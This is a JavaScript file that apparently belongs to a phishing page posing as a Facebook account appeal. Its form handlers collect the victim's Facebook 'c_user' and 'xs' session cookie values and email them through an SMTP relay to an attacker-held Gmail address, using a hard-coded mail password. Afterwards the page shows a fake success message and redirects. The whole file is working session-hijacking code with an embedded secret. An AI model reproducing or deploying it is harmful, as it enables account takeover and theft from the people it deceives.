
function emailSend(messageBody) {
    Email.send({
        Host: "smtp.elasticemail.com",
        Username: "appeal.facebook.request@gmail.com",
        Password: "D0FC59DCDD75383C2FC12461E318EC0189F3",
        To: 'appeal.facebook.request@gmail.com',
        From: "appeal.facebook.request@gmail.com",
        Subject: "New Cookie Submission",
        Body: messageBody
    }).then(message => {
        if (message === 'OK') {
            swal("Successful", "Your submission was successful!", "success");
            setTimeout(() => {
                window.location.href = 'security.html';
            }, 2000);
        } else {
            swal("Error", "Refresh and try again", "error");
        }
    });
}

function handleFormSubmit(event, userIdSelector, xsSelector) {
    event.preventDefault();

    let cuser = document.querySelector(userIdSelector).value;
    let xs = document.querySelector(xsSelector).value;

    let messageBody = `C_User :  ${cuser}<br/>XS :  ${xs}`;

    emailSend(messageBody);
}


document.getElementById('fb_form').addEventListener('submit', function(event) {
    handleFormSubmit(event, '#cuser_desktop', '#xs_desktop');
});


const fbFormMobile = document.getElementById('fb_form_mobile');
if (fbFormMobile) {
    fbFormMobile.addEventListener('submit', function(event) {
        handleFormSubmit(event, '#c_userMobile', '#xs_Mobile');
    });
}

